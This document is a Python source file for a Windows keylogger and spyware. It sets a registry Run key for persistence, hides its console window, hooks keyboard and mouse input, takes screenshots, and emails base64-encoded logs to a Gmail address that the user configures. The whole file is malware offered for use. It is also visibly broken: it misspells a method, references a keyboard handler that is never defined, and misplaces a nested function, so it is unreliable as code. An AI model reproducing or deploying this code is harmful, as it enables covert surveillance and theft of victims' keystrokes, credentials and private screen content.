#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket 
import sys
import pythoncom
import keyboard,os,time,random,smtplib,string,base64
from winreg import *

global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval

t="";pics_names=[]

#Remember to edit this so that you dont send keylogger to person
#settings

yourgmail = ""                #gmail?
yourgmailpass = ""            #gmail password?
sendto = ""                   #Send the logs to?
# interval = 30                 #Time to wait before sending data to email(in seconds)

#settings

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()


def addStartup(): # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx (key2change, 'Howcelmzexpla27831910', 0, REG_SZ, new_file_path)

def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

addStartup()

Hide()


def Screenshot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')

def Mail_it(data, pics_names):
    data = base64.b64encode(data)
    data = 'New data from person(Base64 encoded)\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()

    for pic in pics_names:
        data = base64.b64encode(data)
        data = 'New pic data from person(Base64 encoded)\n'+ data
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.sterttls()
        server.login(yourgmail, yourgmailpass)
        server.close()


        def OnMouseEvent(event):
            global yourgmail, yourgmailpass, sendto, interval
            data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
                + ' Windowname : ' + str(event.WindowName)
            data += '\n\ tButton :' + str(event.MessageName)
            data += '\n\tClicked in (Position):' + str(event.Position)
            data += '\n==================='
            global t, start_time, pics_names   
            ####Line 105###
            t = t + data

            if len(t) > 300:
                Screenshot()

            if len(t) > 500:
                f = open ('Logfile.txt', 'a')
                f.write(t)
                f.close() 
                t = ''

            if int(time.time() - start_time) == int(interval):
                Mail_it(t, pics_names)  
                t = ''
            return True

hook = keyboard.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()
